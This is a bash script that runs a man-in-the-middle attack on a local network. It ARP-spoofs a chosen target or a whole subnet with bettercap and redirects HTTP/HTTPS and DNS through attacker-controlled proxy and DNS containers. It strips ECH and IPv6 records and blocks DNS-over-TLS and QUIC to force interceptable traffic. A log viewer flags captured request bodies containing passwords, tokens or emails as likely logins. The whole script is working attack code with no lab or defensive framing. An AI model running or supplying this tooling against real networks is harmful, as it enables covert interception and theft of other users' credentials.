#!/bin/bash

read -p "Target IP / CIDR (blank = whole subnet): " TARGET
read -p "Attack Interface: " INTERFACE

MY_IP=$(ip -4 addr show "$INTERFACE" | grep -oP '(?<=inet )\d+(\.\d+){3}')
echo "Local IP: $MY_IP"

if [ -z "$TARGET" ]; then
    TARGET=$(ip -4 -o addr show "$INTERFACE" | awk '{print $4}' | head -n1 \
             | awk -F/ '{split($1,a,"."); print a[1]"."a[2]"."a[3]".0/"$2}')
    echo "No target given - spoofing whole subnet: $TARGET"
fi

# Pick whichever compose CLI is available (v2 plugin vs. legacy v1 binary).
if sudo docker compose version >/dev/null 2>&1; then
    DC="docker compose"
elif command -v docker-compose >/dev/null 2>&1; then
    DC="docker-compose"
else
    echo "neither 'docker compose' nor 'docker-compose' found" >&2
    exit 1
fi

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

sudo $DC up -d --build

# Surface any container that immediately crash-loops instead of failing silently.
sleep 2
for c in http-s-proxy dns-filter; do
    state=$(sudo docker inspect -f '{{.State.Status}}' "$c" 2>/dev/null)
    if [ "$state" != "running" ]; then
        echo "WARNING: container $c is $state. Last log lines:"
        sudo docker logs --tail 20 "$c" 2>&1 | sed 's/^/    /'
    fi
done

# Prime the kernel ARP cache for the gateway. bettercap's gateway monitor
# reads /proc/net/arp; if our entry has expired or was never populated
# (e.g. we just woke up / reassociated), it errors with "could not find
# mac for <gateway>" and fullduplex poisoning of the gateway side stalls.
GATEWAY=$(ip route show dev "$INTERFACE" | awk '/^default/{print $3; exit}')
if [ -n "$GATEWAY" ]; then
    echo "Priming ARP cache for gateway $GATEWAY ..."
    ping -c 2 -W 1 -I "$INTERFACE" "$GATEWAY" >/dev/null 2>&1 || true
fi

sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 80  ! -d "$MY_IP" -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 443 ! -d "$MY_IP" -j REDIRECT --to-port 443
sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 80  -j ACCEPT
sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 443 -j ACCEPT

# DNS interception: route all victim DNS lookups to our dnsmasq sidecar
# (bound on host :5300 to avoid the usual port-53 conflict with
# systemd-resolved / NetworkManager). The filter strips HTTPS/SVCB
# records (kills ECH) and AAAA records (forces IPv4 so our v4-only NAT
# actually catches the traffic).
sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p udp --dport 53 -j REDIRECT --to-ports 5300
sudo iptables -t nat -A PREROUTING -i "$INTERFACE" -p tcp --dport 53 -j REDIRECT --to-ports 5300
sudo iptables -A INPUT -i "$INTERFACE" -p udp --dport 5300 -j ACCEPT
sudo iptables -A INPUT -i "$INTERFACE" -p tcp --dport 5300 -j ACCEPT

# Kill DNS-over-TLS (port 853) so browsers/OS fall back to plain DNS,
# which our filtering resolver then catches.
sudo iptables -I FORWARD -i "$INTERFACE" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
sudo iptables -I FORWARD -i "$INTERFACE" -p udp --dport 853 -j REJECT --reject-with icmp-port-unreachable

# Kill HTTP/3 / QUIC. Without this, Chrome/Edge cache Alt-Svc=h3 and
# switch to UDP, which would otherwise be forwarded transparently past
# Caddy -> ERR_QUIC_PROTOCOL_ERROR or cert bypass. Covers the standard
# 443 plus a few alternates CDNs sometimes advertise.
sudo iptables -I FORWARD -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable
sudo iptables -I INPUT   -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable

# Write a tail-logs helper that pretty-prints Caddy access + body logs.
cat > /tmp/tail-logs.sh <<EOF
#!/bin/bash
if ! command -v jq >/dev/null 2>&1; then
    echo "jq missing - showing raw logs. Install with: sudo apt install -y jq" >&2
    exec sudo $DC logs -f --no-log-prefix http-s-proxy
fi
sudo $DC logs -f --no-log-prefix http-s-proxy 2>&1 | jq -rR '
  fromjson?
  | select(.msg=="handled request" or .msg=="request body")
  | if .msg=="handled request" then
      "ACCESS [\(.request.remote_ip)]  \(.request.method) \(.request.host)\(.request.uri)  \(.status) (\(.duration|tostring)s)"
    else
      ((.uri // "") + " " + (.body // "") | ascii_downcase) as \$h
      | if \$h | test("password|passwd|login|signin|sign_in|token|email|username|user=|pass=") then
          "[31;1m*** LIKELY LOGIN *** [\(.remote_ip)]  \(.method) \(.host)\(.uri)\n    CT=\(.content_type)\n    BODY: \(.body)[0m"
        else
          "BODY    [\(.remote_ip)]  \(.method) \(.host)\(.uri)\n    CT=\(.content_type)\n    BODY: \(.body)"
        end
    end'
EOF
chmod +x /tmp/tail-logs.sh

# Spawn it in a new terminal window. Try the common Kali/Debian emulators.
LOG_TERM_PID=""
for term in x-terminal-emulator qterminal xfce4-terminal konsole gnome-terminal xterm; do
    if command -v "$term" >/dev/null 2>&1; then
        case "$term" in
            gnome-terminal) setsid "$term" -- /tmp/tail-logs.sh >/dev/null 2>&1 & ;;
            *)              setsid "$term" -e /tmp/tail-logs.sh >/dev/null 2>&1 & ;;
        esac
        LOG_TERM_PID=$!
        echo "Access log window opened via $term (pid $LOG_TERM_PID)."
        break
    fi
done
if [ -z "$LOG_TERM_PID" ]; then
    echo "No terminal emulator found; run /tmp/tail-logs.sh manually in another shell."
fi

sed "s|TARGET_PLACEHOLDER|$TARGET|" spoof.cap > /tmp/active.cap
sudo bettercap -caplet /tmp/active.cap -iface "$INTERFACE"

# cleanup
sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 80  ! -d "$MY_IP" -j REDIRECT --to-port 80
sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 443 ! -d "$MY_IP" -j REDIRECT --to-port 443
sudo iptables -D INPUT -i "$INTERFACE" -p tcp --dport 80  -j ACCEPT
sudo iptables -D INPUT -i "$INTERFACE" -p tcp --dport 443 -j ACCEPT
sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p udp --dport 53 -j REDIRECT --to-ports 5300
sudo iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 53 -j REDIRECT --to-ports 5300
sudo iptables -D INPUT -i "$INTERFACE" -p udp --dport 5300 -j ACCEPT
sudo iptables -D INPUT -i "$INTERFACE" -p tcp --dport 5300 -j ACCEPT
sudo iptables -D FORWARD -i "$INTERFACE" -p tcp --dport 853 -j REJECT --reject-with tcp-reset
sudo iptables -D FORWARD -i "$INTERFACE" -p udp --dport 853 -j REJECT --reject-with icmp-port-unreachable
sudo iptables -D FORWARD -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable
sudo iptables -D INPUT   -i "$INTERFACE" -p udp -m multiport --dports 80,443,8443 -j REJECT --reject-with icmp-port-unreachable

sudo $DC down

# Log tail dies on its own once the container is down, but nuke its window
# process group in case the terminal lingers.
if [ -n "$LOG_TERM_PID" ]; then
    kill -- -"$LOG_TERM_PID" 2>/dev/null
fi

sudo rm -f /tmp/active.cap /tmp/tail-logs.sh

echo "Done."
